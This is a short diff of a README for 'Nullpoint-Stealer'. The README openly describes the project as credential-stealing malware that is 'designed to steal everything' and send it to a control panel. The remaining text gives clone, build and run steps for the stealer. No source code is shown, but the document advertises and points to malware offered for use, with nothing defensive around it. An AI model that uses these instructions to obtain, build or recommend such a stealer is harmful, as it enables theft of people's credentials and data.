@@ -1,5 +1,4 @@
-## THIS REPO IS OLD, ITS MOVED TO
-https:///luis22d/ZTrace11-Welcome-Future
+## 
 
 # Nullpoint-Stealer
 Nullpoint Stealer Designed To Steal Everything, And Send To Nullpoint Panel.
@@ -71,5 +70,3 @@ git clone https://github.com/msalman-mufin/Nullpoint-Stealer.git cd nullpoint-st
 Open the .sln in Visual Studio
 Build → Release Mode
 Run in a VM
-
-
